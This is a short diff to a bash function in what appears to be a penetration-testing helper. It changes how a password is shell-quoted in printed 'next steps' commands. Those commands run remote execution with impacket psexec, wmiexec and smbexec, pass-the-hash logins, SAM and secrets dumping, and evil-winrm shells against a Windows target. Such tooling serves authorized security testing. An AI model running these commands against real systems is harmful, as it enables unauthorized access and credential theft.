@@ -455,13 +455,14 @@ generate_next_steps() {
                 echo "  nxc smb ${smb_t} -u ${smb_u} -H ${NT_HASH} --sam"
                 echo "  impacket-secretsdump -hashes ${LM_NT_HASH} ${smb_u}@${smb_t}"
             else
-                echo "  impacket-psexec ${smb_u}:'${AUTH_PASS}'@${smb_t}"
-                echo "  impacket-wmiexec ${smb_u}:'${AUTH_PASS}'@${smb_t}"
-                echo "  impacket-smbexec ${smb_u}:'${AUTH_PASS}'@${smb_t}"
+                local q_pass; printf -v q_pass '%q' "$AUTH_PASS"
+                echo "  impacket-psexec ${smb_u}:${q_pass}@${smb_t}"
+                echo "  impacket-wmiexec ${smb_u}:${q_pass}@${smb_t}"
+                echo "  impacket-smbexec ${smb_u}:${q_pass}@${smb_t}"
                 echo ""
                 echo "# SAM dump:"
-                echo "  nxc smb ${smb_t} -u ${smb_u} -p '${AUTH_PASS}' --sam"
-                echo "  impacket-secretsdump ${smb_u}:'${AUTH_PASS}'@${smb_t}"
+                echo "  nxc smb ${smb_t} -u ${smb_u} -p ${q_pass} --sam"
+                echo "  impacket-secretsdump ${smb_u}:${q_pass}@${smb_t}"
             fi
         fi
 
@@ -474,7 +475,8 @@ generate_next_steps() {
             if [[ "$AUTH_TYPE" == "hash" ]]; then
                 echo "  evil-winrm -i ${wrm_t} -u ${wrm_u} -H ${NT_HASH}"
             else
-                echo "  evil-winrm -i ${wrm_t} -u ${wrm_u} -p '${AUTH_PASS}'"
+                local q_wpass; printf -v q_wpass '%q' "$AUTH_PASS"
+                echo "  evil-winrm -i ${wrm_t} -u ${wrm_u} -p ${q_wpass}"
             fi
         fi
 
